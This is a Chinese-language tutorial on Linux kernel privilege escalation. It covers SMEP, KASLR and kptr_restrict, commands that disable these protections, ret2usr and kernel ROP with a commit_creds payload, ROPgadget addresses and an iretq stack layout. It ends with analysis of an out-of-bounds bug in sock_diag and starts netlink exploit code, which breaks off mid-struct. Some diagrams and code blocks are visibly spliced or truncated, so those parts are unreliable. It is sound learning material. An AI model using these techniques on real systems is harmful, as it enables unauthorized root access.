## **0x00 前言**
花了一个月的时间开始学习linux内核提权，把学到的东西都整理在这了~前面介绍了关于内核提权的一些基础知识，后面会分析一个具体的漏洞。
## 0x01 内核提权
#### 分级保护域
在计算机中用于在发生故障时保护数据，提升计算机安全的一种方式，通常称为保护环，简称Rings。在一些硬件或者微代码级别上提供不同特权态模式的CPU架构上，保护环通常都是硬件强制的。Rings是从最高特权级（通常被叫作0级）到最低特权级（通常对应最大的数字）排列的。linux使用了ring0和ring3，ring0用于内核代码和驱动程序，ring3用于用户程序运行。
#### 提权
在内核中想要获得root权限不能只是用`system("/bin/sh");`而是用下面的语句：
    commit_creds(prepare_kernel_cred (0));
这个函数分配并应用了一个新的凭证结构（uid = 0, gid = 0）从而获取root权限。
## 0x02 内核保护措施
#### SMEP
管理模式执行保护。  
保护内核使其不允许执行用户空间代码。也就是防止ret2usr攻击，后文会讲解ret2usr相关知识。  
检查smep是否开启：
    cat /proc/cpuinfo | grep smep
smep位于CR4寄存器的第20位，设置为1。CR4寄存器的值：`0x1407f0 = 0001 0100 0000 0111 1111 0000`。  
关闭SMEP方法  
修改`/etc/default/grub`文件中的GRUB_CMDLINE_LINUX=""，加上nosmep/nosmap/nokaslr，然后`update-grub`就好。
    GRUB_CMDLINE_LINUX="nosmep/nosmap/nokaslr" 
    sudo update-grub
#### KASLR
内核地址空间随机化。
#### 内核地址显示限制
即kptr_ restrict指示是否限制通过/ proc和其他接口暴露内核地址。
  * 0：默认情况下，没有任何限制。
  * 1：使用％pK格式说明符打印的内核指针将被替换为0，除非用户具有CAP_ SYSLOG特权
  * 2：使用％pK打印的内核指针将被替换为0而不管特权。
也就是说，我们不能直接通过`cat /proc/kallsyms`来获得commit_creds的地址：
要禁用该限制使用下面的命令：  
`sudo sysctl -w kernel.kptr_restrict=0`  
## 0x03 ret2usr攻击
ret2usr(return-to-usr)利用了用户空间进程不能访问内核空间，但是内核空间能访问用户空间这个特性来重定向内核代码或数据流指向用户空间，并在非root权限下进行提权。  
将损坏的代码或数据指针重定向到用户空间中：
    |----------------------|                          |----------------------|
    | Function ptr         || sreuct vulu_opos     |
    |----------------------|                          |     *dptr;           |
    |                      |                          |----------------------|
    |----------------------|        内核空间           |                      |
    | Data struct ptr      |                          |                      | 
    |----------------------|                          |                      |
    |----------------------|--------------------------|----------------------|
    |----------------------|                          | struct vuln_ops{     |
    | Data struct          |                          |    void(*a)();       |
    |----------------------|        用户空间           |    int b;            |
    |                      |                          |...};                 |
    |----------------------|                          |----------------------|
    | escalate_privs()     || escalate_privs()     |
    |----------------------|                          |----------------------|
  * 找一个函数指针来覆盖。
  * 在这里我们通常使用ptmx_fops->release()这个指针来指向要重写的内核空间。在内核空间中，ptmx_fops作为静态变量存在，它包含一个指向/ dev / ptmx的file_operations结构的指针。 file_operations结构包含一个函数指针，当对文件描述符执行诸如读/写操作时，该函数指针被执行。
  * 在用户空间中使用mmap提权payload，分配新的凭证结构：
        int __attribute__((regparm(3))) (*commit_creds)(unsigned long cred);
    unsigned long __attribute__((regparm(3))) (*prepare_kernel_cred)(unsigned long cred);
    commit_creds = 0xffffffffxxxxxxxx;
    prepare_kernel_cred = 0xffffffffxxxxxxxx;
    void escalate_privs() { commit_creds(prepare_kernel_cred(0)); }  //获取root权限
> stuct cred —— cred的基本单位  
>  prepare_kernel_cred —— 分配并返回一个新的cred  
>  commit_creds —— 应用新的cred
  * 在用户空间创建一个新的结构体“A”。
  * 用提权函数指针来覆盖这个"A"的指针。
  * 触发提权函数，执行iretq返回用户空间，执行system("/bin/sh")提权
## 0x04 内核ROP
多数情况下系统是会开启SMEP的，这时候就不能使用ret2usr了，可以使用内核ROP技术来绕过SMEP。  
内核空间的ROP和用户空间的ROP其实差不多，但是内核传参一般是通过寄存器而不是栈，而且内核并不和用户空间共用一个栈。  
我们构建一个ROP链让它执行上面的内核提权操作，但是不执行在用户空间的任何指令。  
构造的ROP链结构一般是这样的：
    |----------------------|
    | pop rdi; ret         | vmlinux
之后就可以用ROPgadget来获取gadget了，最好是一次性把gadget都写到一个文件中。
    ROPgadget --binary vmlinux > ~/ropgadget
根据前面我们构造的ROP链，要找pop rdi; ret和mov rdi, rax;
ret这俩gadget，但是在vmlinux里并没有后面这个gadget，只找到下面的：
    0xffffffff81016bc5 : pop rdi ; ret
    0xffffffff810e00d1 : pop rdx ; ret
    0xffffffff8118e3a0 : mov rdi, rax ; call r10
    0xffffffff8142b6d1 : mov rdi, rax ; call r12
    0xffffffff8130217b : mov rdi, rax ; call r14
    0xffffffff81d48ba6 : mov rdi, rax ; call r15
    0xffffffff810d5f34 : mov rdi, rax ; call r8
    0xffffffff8117f534 : mov rdi, rax ; call r9
    0xffffffff8133ed6b : mov rdi, rax ; call rbx
    0xffffffff8105f69f : mov rdi, rax ; call rcx
    0xffffffff810364bf : mov rdi, rax ; call rdx
只好调整最初的ROP链，用mov rdi, rax ; call rdx和pop rdx;
ret代替原来的。用call来执行commit_creds()，而rdi就指向新的凭证结构。  
ROP链如下：
    |----------------------|
    | pop rdi; ret         |;
    mov rXx, rsp ; ret
    add rsp, ...; ret
    xchg rXx, rsp ; ret(xchg eXx, esp ; ret)
    xchg rsp, rXx ; ret(xchg esp, eXx ; ret)
在64位的系统中使用这里的xchg rXx, rsp ; ret（xchg rsp, rXx ; ret）32位的寄存器，即xchg eXx, esp;
ret或xchg esp, eXx ;
ret。这样做其实是当rXx中包含有效的内核内存地址时，就把rXx的低32位设置为新的栈指针。（rax也被设置为rsp的低32位）
之后我们还需要返回到用户空间里执行代码，用下面的两个指令：
    swapgs
    iretq
使用iretq指令返回到用户空间，在执行iretq之前，执行swapgs指令。该指令通过用一个MSR中的值交换GS寄存器的内容，用来获取指向内核数据结构的指针，然后才能执行系统调用之类的内核空间程序。  
iretq的堆栈布局如下：
    |----------------------|
    | RIP                  |sdiag_family);  //传入sdiag_family的值,返回数组指针sock_diag_handlers[reg->sdiag_family].但是没有做边界判断，可能导致越界。
        if (hndl == NULL)
            err = -ENOENT;
        else
            err = hndl->dump(skb, nlh);   //可以利用这个来执行任意代码
        sock_diag_unlock_handler(hndl);
        return err;
    }
    static const inline struct sock_diag_handler *sock_diag_lock_handler(int family)
    {
            if (sock_diag_handlers[family] == NULL)
                    request_module("net-pf-%d-proto-%d-type-%d", PF_NETLINK,
                                    NETLINK_SOCK_DIAG, family);
            mutex_lock(&sock_diag_table_mutex);
            return sock_diag_handlers[family];//这个函数没有对传入的family的值的范围,也就是当family >= AF_MAX时数组越界
    }
    static struct sock_diag_handler *sock_diag_handlers[AF_MAX];
#### 漏洞利用分析
首先我们需要知道如何才能在上面的漏洞下断点然后执行到里面去。查看`net/core/sock_diag.c`源码发现它使用了netlink.h头文件，我们可以利用netlink协议来创建socket并发送数据触发断点。  
查看netlink数据包结构：  
Netlink套接字用于在进程和内核空间之间传递信息。它传达的每个netlink消息的应用程序必须提供以下变量：
    struct nlmsghdr {
        __u32 nlmsg_len;     /*包含标题的消息长度。*/
        __u16 nlmsg_type;    /*消息内容的类型。*/
        __u16 nlmsg_flags;   /*其他标志。*/
        __u32 nlmsg_seq;     /* 序列号。*/
        __u32 nlmsg_pid;     /*发送进程的PID。*/
    };
根据其结构体编写代码：
    struct {  //netlink数据包格式
            struct nlmsghdr nlh;
            struct unix_diag_req r;